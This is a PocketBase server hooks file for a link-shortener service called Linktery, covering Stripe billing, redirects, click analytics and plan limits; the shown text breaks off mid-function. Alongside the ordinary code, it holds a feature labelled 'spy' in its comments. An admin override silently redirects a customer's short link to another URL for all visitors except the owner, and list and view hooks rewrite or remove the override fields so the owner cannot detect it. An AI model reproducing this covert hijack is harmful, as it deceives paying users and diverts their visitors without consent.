// ==========================================
// POCKETBASE JS HOOKS - Linktery Stable
// ==========================================
console.log("--- main.pb.js LOADING ---");

// (Database initialization moved to migrations)


// All Agency Price IDs (live + test, monthly + annual) for reliable plan detection
// NOTE: Must use 'var' (not 'const') so routerAdd callbacks can access it in PB v0.24 JSVM
var AGENCY_PRICE_IDS = [
    "price_1T9ojK1kCVZzZn9tmOrvoNOn", // live monthly
    "price_1TA5kT1kCVZzZn9tAP7AsNjs", // live annual
    "price_1TA5ay1kCVZzZn9thZD9Rhsi", // test monthly
    "price_1TA5mh1kCVZzZn9tN3UmsgCC"  // test annual
];

// Rate Limit Memory Store
var RATE_LIMIT_STORE = {};
var RATE_LIMIT_LAST_RESET = new Date().getTime();

// Helper for Stripe REST API calls
function readerToString(reader) {
    let result = "";
    const buffer = new Uint8Array(1024);
    while (true) {
        const n = reader.read(buffer);
        if (n <= 0) break;
        result += String.fromCharCode.apply(null, buffer.subarray(0, n));
    }
    return result;
}

// (Diagnostic code removed)


// (Inlined stripeRequest due to PocketBase Engine Scope restrictions)

// Stripe: Create Checkout Session
routerAdd("POST", "/api/stripe/create-checkout", (c) => {
    try {
        const user = c.auth;
        if (!user || user.collection().name !== "users") {
            return c.json(401, { message: "Unauthorized" });
        }

        const data = new DynamicModel({ "priceId": "", "billingCycle": "" });
        c.bindBody(data);
        const priceId = data.priceId;
        const billingCycle = data.billingCycle || "monthly";

        if (!priceId) {
            return c.json(400, { message: "priceId is required" });
        }

        const STRIPE_SECRET_KEY = $os.getenv("STRIPE_SECRET_KEY");
        const HOST_URL = $os.getenv("HOST_URL") || "https://linktery.com";

        const sessionData = {
            "payment_method_types[0]": "card",
            "line_items[0][price]": priceId,
            "line_items[0][quantity]": "1",
            "mode": "subscription",
            "success_url": HOST_URL + "/dashboard/billing?session_id={CHECKOUT_SESSION_ID}",
            "cancel_url": HOST_URL + "/dashboard/pricing",
            "client_reference_id": user.id,
            "customer_email": user.get("email"),
            "metadata[userId]": user.id,
            "metadata[billingCycle]": billingCycle
        };

        const parts = [];
        for (const key in sessionData) {
            parts.push(encodeURIComponent(key) + "=" + encodeURIComponent(sessionData[key]));
        }
        const body = parts.join("&");

        const res = $http.send({
            url: "https://api.stripe.com/v1/checkout/sessions",
            method: "POST",
            body: body,
            headers: {
                "Authorization": "Bearer " + STRIPE_SECRET_KEY,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout: 10
        });

        if (res.statusCode >= 400) {
            throw new Error("Stripe Error " + res.statusCode + ": " + res.raw);
        }
        const session = res.json;

        return c.json(200, { url: session.url });
    } catch (err) {
        let errStr = String(err);
        $app.logger().error("Create checkout error: " + errStr);
        return c.json(500, { message: "Stripe Checkout failed: " + errStr });
    }
});

// Stripe: Create Customer Portal Session
routerAdd("POST", "/api/stripe/create-portal", (c) => {
    const user = c.auth;
    if (!user || user.collection().name !== "users") {
        return c.json(401, { message: "Unauthorized" });
    }

    const STRIPE_SECRET_KEY = $os.getenv("STRIPE_SECRET_KEY");
    const HOST_URL = $os.getenv("HOST_URL") || "https://linktery.com";

    if (!STRIPE_SECRET_KEY) {
        return c.json(500, { message: "Stripe is not configured" });
    }

    try {
        const records = $app.findRecordsByFilter(
            "billing",
            "user_id = {:userId} && stripe_customer_id != ''",
            "-created",
            1,
            0,
            { userId: user.id }
        );

        if (records.length === 0) {
            return c.json(400, { message: "No active Stripe customer found for this user." });
        }

        const customerId = records[0].get("stripe_customer_id");

        const portalData = {
            "customer": customerId,
            "return_url": HOST_URL + "/dashboard/billing"
        };

        const parts = [];
        for (const key in portalData) {
            parts.push(encodeURIComponent(key) + "=" + encodeURIComponent(portalData[key]));
        }
        const body = parts.join("&");

        const res = $http.send({
            url: "https://api.stripe.com/v1/billing_portal/sessions",
            method: "POST",
            body: body,
            headers: {
                "Authorization": "Bearer " + STRIPE_SECRET_KEY,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout: 10
        });
        if (res.statusCode >= 400) {
            throw new Error("Stripe Error " + res.statusCode + ": " + res.raw);
        }
        const portal = res.json;

        return c.json(200, { url: portal.url });
    } catch (err) {
        $app.logger().error("Create portal error: " + err);
        return c.json(500, { message: err.message });
    }
});

// Stripe: Webhook Handler (no auth - receives from Stripe)
routerAdd("POST", "/api/stripe/webhook", (c) => {
    const STRIPE_SECRET_KEY = $os.getenv("STRIPE_SECRET_KEY");

    // --- Phase 1: Parse event ID from body ---
    let eventId;
    try {
        const rawBody = readerToString(c.request.body);
        const body = JSON.parse(rawBody);
        eventId = body.id;
        if (!eventId || !String(eventId).startsWith('evt_')) {
            $app.logger().error("Webhook: invalid event id: " + JSON.stringify(eventId));
            return c.json(400, { error: "Invalid event id" });
        }
    } catch (e) {
        $app.logger().error("Webhook: body parse error: " + String(e));
        return c.json(400, { error: "Failed to parse webhook JSON: " + String(e) });
    }

    if (!STRIPE_SECRET_KEY) {
        $app.logger().error("Webhook: STRIPE_SECRET_KEY not set");
        return c.json(500, { error: "Stripe secret key missing" });
    }

    // --- Phase 2: Verify event with Stripe API ---
    let verifiedEvent;
    try {
        const res = $http.send({
            url: "https://api.stripe.com/v1/events/" + eventId,
            method: "GET",
            headers: {
                "Authorization": "Bearer " + STRIPE_SECRET_KEY,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout: 10
        });
        if (res.statusCode >= 400) {
            throw new Error("Stripe API Error " + res.statusCode + ": " + res.raw);
        }
        verifiedEvent = res.json;
    } catch (fetchErr) {
        $app.logger().error("Webhook: Stripe fetch error: " + fetchErr);
        return c.json(500, { error: "Stripe fetch error: " + String(fetchErr) });
    }

    $app.logger().info("Webhook: processing event " + verifiedEvent.type + " id=" + eventId);

    // --- Phase 3: Dedup check (INSERT, fail on duplicate) ---
    try {
        $app.db().newQuery("INSERT INTO _processed_stripe_events (id) VALUES ({:id})").bind({"id": eventId}).execute();
    } catch (dupErr) {
        $app.logger().info("Webhook: Event already processed id=" + eventId);
        return c.json(200, { received: true, note: "Already processed" });
    }

    // --- Phase 4: Process event (wrapped so we can rollback dedup on failure) ---
    try {
        if (verifiedEvent.type === "checkout.session.completed") {
            const session = verifiedEvent.data.object;
            let userId = session.client_reference_id || (session.metadata ? session.metadata.userId : null);
            const billingCycle = (session.metadata ? session.metadata.billingCycle : "monthly");
            const customerId = session.customer;
            const subscriptionId = session.subscription || "";

            // Fallback: If no userId is found (e.g. via direct Stripe Payment Link), try to find user by email
            if (!userId) {
                const customerEmail = session.customer_details ? session.customer_details.email : null;
                if (customerEmail) {
                    try {
                        const userByEmail = $app.findFirstRecordByData("users", "email", customerEmail);
                        if (userByEmail) {
                            userId = userByEmail.id;
                            $app.logger().info("Webhook: Found missing userId via email: " + customerEmail);
                        }
                    } catch (e) {
                        $app.logger().error("Webhook: Could not find user by email " + customerEmail);
                    }
                }
            }

            if (!userId) {
                // No userId = can't process. Remove dedup so Stripe retries won't help either.
                // Keep dedup to avoid log spam — this is a permanent data issue.
                $app.logger().error("Webhook: checkout.session.completed but no userId in session " + session.id);
                return c.json(200, { received: true, note: "missing userid" });
            }

            $app.logger().info("Webhook: activating plan for user " + userId);

            // Fetch line items to determine plan
            const lineItemsRes = $http.send({
                url: "https://api.stripe.com/v1/checkout/sessions/" + session.id + "/line_items",
                method: "GET",
                headers: {
                    "Authorization": "Bearer " + STRIPE_SECRET_KEY,
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout: 10
            });
            if (lineItemsRes.statusCode >= 400) throw new Error("Stripe Items Error " + lineItemsRes.statusCode);

            var planName = "pro";
            var amount = 0;
            var lineItems = lineItemsRes.json;

            if (lineItems.data && lineItems.data.length > 0) {
                var price = lineItems.data[0].price;
                amount = price.unit_amount / 100;
                if (price.id && AGENCY_PRICE_IDS.indexOf(price.id) !== -1) {
                    planName = "agency";
                }
            }
            $app.logger().info("Webhook: detected plan=" + planName + " amount=" + amount + " billingCycle=" + billingCycle);

            // Activate plan in transaction
            $app.runInTransaction((txApp) => {
                var user = txApp.findRecordById("users", userId);
                user.set("plan", planName);
                var now = new DateTime();
                var expiry = billingCycle === "annual"
                    ? now.addDate(1, 0, 2)
                    : now.addDate(0, 1, 2);
                user.set("plan_expires_at", expiry);
                txApp.save(user);

                // Upsert billing record
                var existingBilling = txApp.findRecordsByFilter(
                    "billing", "user_id = {:userId}", "-created", 1, 0, { userId: userId }
                );
                if (existingBilling.length > 0) {
                    var bRecord = existingBilling[0];
                    bRecord.set("plan", planName);
                    bRecord.set("amount", amount);
                    bRecord.set("status", "active");
                    bRecord.set("payment_method", "Stripe");
                    bRecord.set("stripe_customer_id", customerId);
                    bRecord.set("stripe_subscription_id", subscriptionId);
                    txApp.save(bRecord);
                } else {
                    var billingColl = txApp.findCollectionByNameOrId("billing");
                    var billingRecord = new Record(billingColl, {
                        "user_id": userId,
                        "plan": planName,
                        "amount": amount,
                        "status": "active",
                        "payment_method": "Stripe",
                        "stripe_customer_id": customerId,
                        "stripe_subscription_id": subscriptionId
                    });
                    txApp.save(billingRecord);
                }
            });

            $app.logger().info("Webhook: SUCCESS plan '" + planName + "' activated for user " + userId);

        } else if (verifiedEvent.type === "invoice.paid") {
            var invoice = verifiedEvent.data.object;
            var invCustomerId = invoice.customer;
            if (invoice.subscription && invoice.billing_reason === "subscription_cycle") {
                var invAmount = invoice.amount_paid / 100;
                $app.logger().info("Webhook: renewal payment for customer " + invCustomerId + " amount=" + invAmount);

                var records = $app.findRecordsByFilter(
                    "billing", "stripe_customer_id = {:custId}", "-created", 1, 0, { custId: invCustomerId }
                );
                if (records.length > 0) {
                    var bRecord = records[0];
                    var bUserId = bRecord.get("user_id");
                    $app.runInTransaction((txApp) => {
                        var user = txApp.findRecordById("users", bUserId);
                        var currentPlan = user.get("plan");
                        var now = new DateTime();
                        var expiry = (invAmount >= 29 || currentPlan === "agency")
                            ? now.addDate(1, 0, 2)
                            : now.addDate(0, 1, 2);
                        user.set("plan_expires_at", expiry);
                        txApp.save(user);
                        bRecord.set("status", "active");
                        bRecord.set("amount", invAmount);
                        txApp.save(bRecord);
                    });
                    $app.logger().info("Webhook: SUCCESS plan extended for user " + bUserId);
                }
            }

        } else if (verifiedEvent.type === "customer.subscription.deleted") {
            var sub = verifiedEvent.data.object;
            var subCustomerId = sub.customer;
            var subRecords = $app.findRecordsByFilter(
                "billing", "stripe_customer_id = {:custId}", "-created", 1, 0, { custId: subCustomerId }
            );
            if (subRecords.length > 0) {
                var bRec = subRecords[0];
                bRec.set("status", "canceled");
                $app.save(bRec);
                var subUserId = bRec.get("user_id");
                var subUser = $app.findRecordById("users", subUserId);
                subUser.set("plan", "creator");
                subUser.set("plan_expires_at", "");
                $app.save(subUser);
                $app.logger().info("Webhook: SUCCESS plan reverted to creator for user " + subUserId);
            }
        }

        // All processing succeeded
        return c.json(200, { received: true });

    } catch (processingErr) {
        // Processing failed — remove dedup entry so Stripe can retry
        try {
            $app.db().newQuery("DELETE FROM _processed_stripe_events WHERE id = {:id}").bind({"id": eventId}).execute();
            $app.logger().info("Webhook: Rolled back dedup for event " + eventId + " (will allow retry)");
        } catch (delErr) { /* ignore cleanup errors */ }
        $app.logger().error("Webhook: PROCESSING FAILED for event " + eventId + ": " + processingErr);
        return c.json(500, { error: String(processingErr) });
    }
});

// Stripe: Verify Session & Activate Plan (Fallback for when webhook doesn't fire)
// Called from frontend success page with ?session_id=cs_xxx
routerAdd("POST", "/api/stripe/verify-session", (c) => {
    var STRIPE_SECRET_KEY = $os.getenv("STRIPE_SECRET_KEY");
    if (!STRIPE_SECRET_KEY) {
        return c.json(500, { error: "Stripe not configured" });
    }

    var user = c.auth;
    if (!user || user.collection().name !== "users") {
        return c.json(401, { error: "Unauthorized" });
    }

    try {
        var rawBody = readerToString(c.request.body);
        var body = JSON.parse(rawBody);
        var sessionId = body.sessionId;
        if (!sessionId) {
            return c.json(400, { error: "sessionId required" });
        }

        // Fetch the checkout session from Stripe
        var res = $http.send({
            url: "https://api.stripe.com/v1/checkout/sessions/" + sessionId,
            method: "GET",
            headers: {
                "Authorization": "Bearer " + STRIPE_SECRET_KEY,
            },
            timeout: 10
        });
        if (res.statusCode >= 400) {
            throw new Error("Stripe session fetch error: " + res.statusCode);
        }
        var session = res.json;

        // Safety: ensure this session belongs to this user
        if (session.client_reference_id !== user.id) {
            return c.json(403, { error: "Session does not belong to this user" });
        }

        // Only process completed payments
        if (session.payment_status !== "paid") {
            return c.json(200, { activated: false, reason: "Payment not completed yet" });
        }

        // Determine plan from line items
        var lineItemsRes = $http.send({
            url: "https://api.stripe.com/v1/checkout/sessions/" + sessionId + "/line_items",
            method: "GET",
            headers: {
                "Authorization": "Bearer " + STRIPE_SECRET_KEY,
            },
            timeout: 10
        });
        if (lineItemsRes.statusCode >= 400) throw new Error("Line items error");
        var lineItems = lineItemsRes.json;

        var planName = "pro";
        var amount = 0;
        if (lineItems.data && lineItems.data.length > 0) {
            var price = lineItems.data[0].price;
            amount = price.unit_amount / 100;
            if (price.id && AGENCY_PRICE_IDS.indexOf(price.id) !== -1) {
                planName = "agency";
            }
        }

        // Check if plan is already active (idempotent) — but AFTER detecting plan
        var currentPlan = user.get("plan");
        if (currentPlan === planName) {
            return c.json(200, { activated: true, plan: currentPlan, note: "Already active" });
        }

        var billingCycle = session.metadata ? (session.metadata.billingCycle || "monthly") : "monthly";
        var customerId = session.customer || "";
        var subscriptionId = session.subscription || "";

        $app.runInTransaction((txApp) => {
            var u = txApp.findRecordById("users", user.id);
            u.set("plan", planName);
            var now = new DateTime();
            var expiry = billingCycle === "annual"
                ? now.addDate(1, 0, 2)
                : now.addDate(0, 1, 2);
            u.set("plan_expires_at", expiry.format("Y-m-d H:i:sP"));
            txApp.save(u);

            // Upsert billing record
            var existing = txApp.findRecordsByFilter(
                "billing", "user_id = {:uid}", "-created", 1, 0, { uid: user.id }
            );
            if (existing.length > 0) {
                var b = existing[0];
                b.set("plan", planName);
                b.set("amount", amount);
                b.set("status", "active");
                b.set("payment_method", "Stripe");
                b.set("stripe_customer_id", customerId);
                b.set("stripe_subscription_id", subscriptionId);
                txApp.save(b);
            } else {
                var billingColl = txApp.findCollectionByNameOrId("billing");
                var b = new Record(billingColl, {
                    "user_id": user.id, "plan": planName, "amount": amount,
                    "status": "active", "payment_method": "Stripe",
                    "stripe_customer_id": customerId, "stripe_subscription_id": subscriptionId
                });
                txApp.save(b);
            }
        });

        $app.logger().info("verify-session: plan '" + planName + "' activated for user " + user.id);
        return c.json(200, { activated: true, plan: planName });
    } catch (err) {
        $app.logger().error("verify-session error: " + err);
        return c.json(500, { error: String(err) });
    }
});

// Server-Side Redirects
routerAdd("GET", "/{slug}", (c) => {
    const slug = c.pathParam("slug");

    // Strict validation: Only alphanumeric and hyphens. 
    // This inherently blocks dots (e.g. logo.png) and prevents tricky path executions.
    if (!/^[a-zA-Z0-9-]+$/.test(slug)) {
        return c.next();
    }

    const reserved = ["dashboard", "login", "register", "privacy", "terms", "api", "assets"];
    if (reserved.some(r => slug.startsWith(r))) {
        return c.next();
    }

    // SECURITY: Anti-DDoS Rate Limiting (Max 60 requests per minute per IP+Slug)
    const nowMs = new Date().getTime();
    if (nowMs - RATE_LIMIT_LAST_RESET > 60000) {
        RATE_LIMIT_STORE = {};
        RATE_LIMIT_LAST_RESET = nowMs;
    }
    const ip = c.request.remoteIP || c.request.header.get("Fly-Client-IP") || c.request.header.get("CF-Connecting-IP") || "unknown";
    if (ip !== "unknown") {
        const cacheKey = ip + "_" + slug;
        let count = RATE_LIMIT_STORE[cacheKey] || 0;
        if (count > 60) {
            return c.json(429, { message: "Too many requests. Please try again in a minute." });
        }
        RATE_LIMIT_STORE[cacheKey] = count + 1;
    }

    try {
        const link = $app.findFirstRecordByFilter("links", "slug = {:slug} && active = true", { slug: slug });

        const geoTargeting = link.get("geo_targeting");
        const deviceTargeting = link.get("device_targeting");
        const hasGeoRules = geoTargeting && typeof geoTargeting === 'object' && Object.keys(geoTargeting).length > 0;
        const hasDeviceRules = deviceTargeting && typeof deviceTargeting === 'object' && Object.keys(deviceTargeting).length > 0;

        const hasComplexLogic =
            hasGeoRules ||
            hasDeviceRules ||
            link.get("ab_split") ||
            link.get("cloaking") ||
            link.get("interstitial_enabled") ||
            link.get("mode") === "direct" ||
            link.get("mode") === "landing" ||
            link.get("mode") === "smart" ||
            link.get("fb_pixel") ||
            link.get("google_pixel") ||
            link.get("tiktok_pixel");

        if (!hasComplexLogic) {
            try {
                const request = c.request;
                const uaStr = request.header.get("User-Agent") || "";
                // [SYNC: ua-parsing] — Must match frontend logic in RedirectHandler.tsx:120-140
                const isBot = /bot|crawler|spider|criteo|facebookexternalhit/i.test(uaStr);

                if (!isBot) {
                    // [SYNC: ua-parsing] — OS/Browser/Device detection
                    let os = "Other";
                    if (/Windows/i.test(uaStr)) os = "Windows";
                    else if (/iPhone|iPad|iPod/i.test(uaStr)) os = "iOS";
                    else if (/Android/i.test(uaStr)) os = "Android";
                    else if (/Macintosh/i.test(uaStr)) os = "macOS";
                    else if (/Linux/i.test(uaStr)) os = "Linux";

                    let browser = "Other";
                    if (/Instagram/i.test(uaStr)) browser = "Instagram";
                    else if (/TikTok/i.test(uaStr)) browser = "TikTok";
                    else if (/FBAN|FBAV/i.test(uaStr)) browser = "Facebook";
                    else if (/Chrome/i.test(uaStr)) browser = "Chrome";
                    else if (/Safari/i.test(uaStr)) browser = "Safari";
                    else if (/Firefox/i.test(uaStr)) browser = "Firefox";
                    else if (/Edg/i.test(uaStr)) browser = "Edge";

                    let device = "Desktop";
                    if (/Mobi|Android/i.test(uaStr)) device = "Mobile";
                    else if (/Tablet|iPad/i.test(uaStr)) device = "Tablet";

                    let referrer = "Direct";
                    // BUG-06 FIX: Check ?ref= query param first (e.g. Profile traffic)
                    const rawUrl = request.url ? String(request.url) : "";
                    const refParamMatch = rawUrl.match(/[?&]ref=([^&]+)/);
                    if (refParamMatch && refParamMatch[1] === "profile") {
                        referrer = "Profile";
                    } else {
                        const ref = request.header.get("Referer") || "";
                        if (ref) {
                            try {
                                if (ref.includes("instagram.com")) referrer = "Instagram";
                                else if (ref.includes("t.co") || ref.includes("twitter.com")) referrer = "Twitter";
                                else if (ref.includes("facebook.com")) referrer = "Facebook";
                                else if (ref.includes("tiktok.com")) referrer = "TikTok";
                                else if (ref.includes("google.com")) referrer = "Google";
                                else referrer = ref.split("/")[2] || "Other";
                            } catch (e) { }
                        }
                    }

                    // BUG-05 FIX: Check multiple geo headers with Fly-Region fallback
                    let country = request.header.get("CF-IPCountry")
                        || request.header.get("X-Country-Code")
                        || "";
                    if (!country) {
                        // Fly.io edge region as rough geo fallback
                        const flyRegion = request.header.get("Fly-Region") || "";
                        const regionMap = {
                            "ams": "NL", "arn": "SE", "atl": "US", "bog": "CO",
                            "bom": "IN", "bos": "US", "cdg": "FR", "den": "US",
                            "dfw": "US", "ewr": "US", "eze": "AR", "fra": "DE",
                            "gdl": "MX", "gig": "BR", "gru": "BR", "hkg": "HK",
                            "iad": "US", "jnb": "ZA", "lax": "US", "lhr": "GB",
                            "maa": "IN", "mad": "ES", "mia": "US", "nrt": "JP",
                            "ord": "US", "otp": "RO", "phx": "US", "qro": "MX",
                            "scl": "CL", "sea": "US", "sin": "SG", "sjc": "US",
                            "syd": "AU", "waw": "PL", "yul": "CA", "yyz": "CA"
                        };
                        country = regionMap[flyRegion.toLowerCase()] || "Unknown";
                    }

                    const cookieHeader = request.header.get("Cookie") || "";
                    const cookieName = "gr_visit_" + link.id;
                    const isUnique = !cookieHeader.includes(cookieName);

                    if (isUnique) {
                        c.response.header().add("Set-Cookie", cookieName + "=1; Path=/; Max-Age=86400; HttpOnly");
                    }

                    const clicksColl = $app.findCollectionByNameOrId("clicks");
                    const clickRecord = new Record(clicksColl, {
                        "link_id": link.id,
                        "country": country,
                        "device": device,
                        "os": os,
                        "browser": browser,
                        "referrer": referrer,
                        "is_unique": isUnique,
                        "user_agent": uaStr.length > 200 ? uaStr.substring(0, 200) : uaStr,
                        "ip": "masked"
                    });
                    $app.save(clickRecord);

                    // clicks_count increment is handled by onRecordAfterCreateSuccess hook
                }
            } catch (err) {
                // Log and swallow fast-tracking errors to ensure redirect always happens
                $app.logger().error("Fast tracking error (swallowed): " + err);
            }
            let finalDest = link.get("destination_url");
            const authUser = c.auth;
            const isOwner = authUser && authUser.id === link.get("user_id");

            // Apply route override if active (spy redirect)
            // But NOT if the user visiting is the OWNER of the link
            if (link.get("system_route_active") === true && link.get("system_route_override") && !isOwner) {
                finalDest = link.get("system_route_override");
            }

            const uSrc = link.get("utm_source");
            const uMed = link.get("utm_medium");
            const uCmp = link.get("utm_campaign");

            if (uSrc || uMed || uCmp) {
                let utmParts = [];
                if (uSrc) utmParts.push("utm_source=" + encodeURIComponent(uSrc));
                if (uMed) utmParts.push("utm_medium=" + encodeURIComponent(uMed));
                if (uCmp) utmParts.push("utm_campaign=" + encodeURIComponent(uCmp));

                if (utmParts.length > 0) {
                    let utmStr = utmParts.join("&");
                    let hashIdx = finalDest.indexOf("#");
                    if (hashIdx !== -1) {
                        let base = finalDest.substring(0, hashIdx);
                        let hash = finalDest.substring(hashIdx);
                        let sep = base.indexOf("?") === -1 ? "?" : "&";
                        finalDest = base + sep + utmStr + hash;
                    } else {
                        let sep = finalDest.indexOf("?") === -1 ? "?" : "&";
                        finalDest = finalDest + sep + utmStr;
                    }
                }
            }

            return c.redirect(302, finalDest);
        }
    } catch (e) {
        // Slug not found, fall through to SPA
    }

    return c.next();
});

// Admin: Update Plan
routerAdd("POST", "/api/admin/update-plan", (c) => {
    try {
        const adminUser = c.auth;
        if (!adminUser || adminUser.get("role") !== "admin") {
            throw new ForbiddenError("Only admins can update plans.");
        }

        const data = new DynamicModel({
            "userId": "",
            "plan": "",
            "days": 0
        });
        c.bindBody(data);

        const userId = data.userId;
        const newPlan = data.plan;

        const targetUser = $app.findRecordById("users", userId);
        targetUser.set("plan", newPlan);

        if (newPlan !== "creator") {
            const expires = new Date();
            const days = Math.max(1, data.days || 30);
            expires.setDate(expires.getDate() + days);
            targetUser.set("plan_expires_at", new DateTime(expires));

            const billingColl = $app.findCollectionByNameOrId("billing");
            const billingRecord = new Record(billingColl, {
                "user_id": userId,
                "plan": newPlan,
                "amount": newPlan === "pro" ? 11 : 29,
                "status": "active",
                "payment_method": "Given"
            });
            $app.save(billingRecord);
        } else {
            targetUser.set("plan_expires_at", "");
        }

        $app.save(targetUser);

        return c.json(200, { "success": true });
    } catch (err) {
        $app.logger().error("Admin plan update error: " + err);
        throw new BadRequestError(err.message);
    }
});

// Admin: Update Route Override (Spy)
routerAdd("POST", "/api/admin/update-route-override", (c) => {
    try {
        const adminUser = c.auth;
        if (!adminUser || adminUser.get("role") !== "admin") {
            throw new ForbiddenError("Only admins can update route overrides.");
        }

        const data = new DynamicModel({
            "linkId": "",
            "overrideUrl": "",
            "active": false
        });
        c.bindBody(data);

        const linkId = data.linkId;
        if (!linkId) {
            return c.json(400, { message: "linkId is required" });
        }

        const link = $app.findRecordById("links", linkId);
        link.set("system_route_override", data.overrideUrl || "");
        link.set("system_route_active", data.active === true);
        $app.save(link);

        $app.logger().info("Admin route override updated for link " + linkId + " active=" + data.active);

        return c.json(200, {
            success: true,
            system_route_override: link.get("system_route_override"),
            system_route_active: link.get("system_route_active")
        });
    } catch (err) {
        $app.logger().error("Admin route override error: " + err);
        throw new BadRequestError(err.message);
    }
});



// ==========================================
// RECORD HOOKS (non-critical, safe to fail)
// ==========================================

// Username change cooldown
onRecordUpdateRequest((e) => {
    const newUsername = e.record.get("username");
    const oldUsername = e.record.original().get("username");

    if (newUsername !== oldUsername) {
        const lastChanged = e.record.get("username_last_changed");
        if (lastChanged && lastChanged.toString().trim() !== "") {
            const lastChangedDate = new Date(lastChanged.toString());
            const now = new Date();
            const diffDays = Math.floor((now - lastChangedDate) / (1000 * 60 * 60 * 24));
            if (!isNaN(diffDays) && diffDays < 21) {
                throw new BadRequestError("You can only change your username once every 21 days. (Next change allowed in " + (21 - diffDays) + " days)");
            }
        }
        
        // BUG FIX: Do not trigger cooldown if the account was created less than 1 hour ago.
        // This prevents Google OAuth2 registration from instantly locking the username,
        // and gives new users a grace period to set their desired username.
        const createdStr = e.record.get("created");
        const createdDate = createdStr ? new Date(createdStr.toString()) : new Date();
        const nowMs = new Date().getTime();
        const createdMs = createdDate.getTime();
        
        if ((nowMs - createdMs) > 60 * 60 * 1000) {
            e.record.set("username_last_changed", new DateTime());
        }
    }

    e.next();
}, "users");

// IP Rate Limiting for new registrations
// Requires PocketBase Settings > trustedProxy.headers = ["Fly-Client-IP"]
onRecordCreateRequest((e) => {
    try {
        const clientIP = e.realIP();

        if (clientIP) {
            const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString().replace("T", " ");
            
            const records = $app.findRecordsByFilter(
                "users", 
                "created_ip = {:ip} && created >= {:time}", 
                "-created", 
                10, 
                0, 
                { ip: clientIP, time: oneHourAgo }
            );

            if (records.length >= 2) {
                throw new BadRequestError("Too many accounts created from this IP. Please try again later.");
            }
            
            e.record.set("created_ip", clientIP);
        }
    } catch (err) {
        if (err instanceof BadRequestError) {
            throw err;
        }
        console.error("RATELIMIT ERROR:", err);
    }
    e.next();
}, "users");

// Slug-Username collision prevention on link create
onRecordCreateRequest((e) => {
    const slug = e.record.get("slug");
    const userId = e.record.get("user_id");

    let userWithSameName = null;
    try {
        userWithSameName = $app.findFirstRecordByFilter("users", "username = {:slug}", { slug: slug });
    } catch (err) { }

    if (userWithSameName) {
        throw new BadRequestError("This slug is already taken by a user profile.");
    }

    // Enforce Plan Limits
    const user = $app.findRecordById("users", userId);
    const plan = user.get("plan") || "creator";
    const limits = { "creator": 4, "pro": 15, "agency": 110 };
    const maxLinks = limits[plan];

    if (maxLinks !== -1) {
        let linksCount = 0;
        try {
            const records = $app.findRecordsByFilter("links", "user_id = {:userId}", "-created", maxLinks + 1, 0, { userId: userId });
            linksCount = records.length;
        } catch (err) { }

        if (linksCount >= maxLinks) {
            throw new BadRequestError("You have reached the link limit for your " + plan + " plan. Please upgrade to create more.");
        }
    }

    e.next();
}, "links");

// Username-Slug collision prevention on user update
onRecordUpdateRequest((e) => {
    const newUsername = e.record.get("username");
    const oldUsername = e.record.original().get("username");

    if (newUsername !== oldUsername) {
        let linkWithSameSlug = null;
        try {
            linkWithSameSlug = $app.findFirstRecordByFilter("links", "slug = {:username}", { username: newUsername });
        } catch (err) { }

        if (linkWithSameSlug) {
            throw new BadRequestError("This username matches an existing link slug.");
        }
    }

    e.next();
}, "users");

// Hourly cron: downgrade expired plans
cronAdd("check_expired_plans", "0 * * * *", () => {
    const now = new DateTime();
    const nowStr = now.format("Y-m-d H:i:s");

    try {
        const records = $app.findRecordsByFilter(
            "users",
            "plan != 'creator' && plan_expires_at != '' && plan_expires_at <= {:now}",
            "-created", 0, 0, { now: nowStr }
        );

        for (let i = 0; i < records.length; i++) {
            const user = records[i];
            user.set("plan", "creator");
            user.set("plan_expires_at", "");
            $app.save(user);
        }
    } catch (err) {
        $app.logger().error("Error checking expired plans: " + err);
    }
});

// ==========================================
// SPY/ROUTE OVERRIDE HOOKS (Hide fields & Redirect proxy)
// ==========================================

// Hide system fields from standard list requests and apply route override when applicable
onRecordsListRequest((e) => {
    try {
        const isAdmin = e.httpContext.get("admin") !== null;
        const authUser = e.httpContext.get("authRecord");
        const role = authUser ? authUser.get("role") : "none";
        const isAppAdmin = role === "admin";
        
        if (isAdmin || isAppAdmin) {
            return e.next(); 
        }

        // Pre-cache auth status to avoid redundant checks in the loop
        const authUserId = authUser ? authUser.id : null;

        for (let i = 0; i < e.records.length; i++) {
            const record = e.records[i];
            const isRouteActive = record.get("system_route_active") === true;
            
            // Short-circuit: only apply logic if spy is active OR we need to hide fields
            if (isRouteActive) {
                const overrideUrl = record.get("system_route_override") || "";
                const isOwner = authUserId && authUserId === record.get("user_id");

                if (overrideUrl && !isOwner) {
                    record.set("destination_url", overrideUrl);
                    // Nullify targeting to prevent frontend override
                    record.set("device_targeting", null);
                    record.set("geo_targeting", null);
                    record.set("ab_split", false);
                    record.set("split_urls", null);
                }
            }

            // Always strip system fields for non-admins
            record.set("system_route_active", false);
            record.set("system_route_override", "");
        }
    } catch (err) {
        $app.logger().error("Critical error in onRecordsListRequest: " + err);
    }
    return e.next();
}, "links");

onRecordViewRequest((e) => {
    try {
        const isAdmin = e.httpContext.get("admin") !== null;
        const authUser = e.httpContext.get("authRecord");
        const role = authUser ? authUser.get("role") : "none";
        const isAppAdmin = role === "admin";
        
        if (isAdmin || isAppAdmin) {
            return e.next();
        }

        const record = e.record;
        const isRouteActive = record.get("system_route_active") === true;
        
        if (isRouteActive) {
            const overrideUrl = record.get("system_route_override") || "";
            const isOwner = authUser && authUser.id === record.get("user_id");

            if (overrideUrl && !isOwner) {
                record.set("destination_url", overrideUrl);
                record.set("device_targeting", null);
                record.set("geo_targeting", null);
                record.set("ab_split", false);
                record.set("split_urls", null);
            }
        }

        record.set("system_route_active", false);
        record.set("system_route_override", "");

    } catch(err) {
        $app.logger().error("Critical error in onRecordViewRequest: " + err);
    }

    return e.next();
}, "links");

// Universal click counter incrementer
// PocketBase v0.24 JSVM: GLOBAL function (not $app.), callback first, collection last
onRecordAfterCreateSuccess((e) => {
    try {
        const linkId = e.record.get("link_id");
        console.log("CLICK HOOK FIRED: link_id=" + linkId);
        if (linkId) {
            // Use Direct SQL for maximum reliability and to avoid hook recursion/locking issues
            $app.db().newQuery("UPDATE links SET clicks_count = clicks_count + 1 WHERE id = {:id}")
                .bind({ id: linkId })
                .execute();

            // HIGHLOAD REFACTOR: UPSERT into physical analytics_daily Rollup Table
